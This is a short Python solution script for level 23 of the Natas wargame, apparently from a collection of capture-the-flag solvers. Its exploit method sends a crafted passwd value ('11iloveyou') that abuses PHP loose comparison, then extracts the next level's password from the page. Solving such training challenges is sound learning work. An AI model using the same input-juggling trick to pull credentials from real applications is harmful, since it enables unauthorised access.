import re
from src.natas.base_level import NatasLevel

class Level_23(NatasLevel):

  num = 23
  explanation = "On this level, `strstr()` checks whether the password contains 'iloveyou'\n     and is greater than 10. We use '11iloveyou', which satisfies both conditions."

  def exploit(self) -> str:

    resp  = self.session.get(self.base_url + "/index.php?passwd=11iloveyou")
    match = re.search(r'Password: (.*)', resp.text, re.MULTILINE).group().replace("Password", "").replace("</pre>", "").strip()

    return match
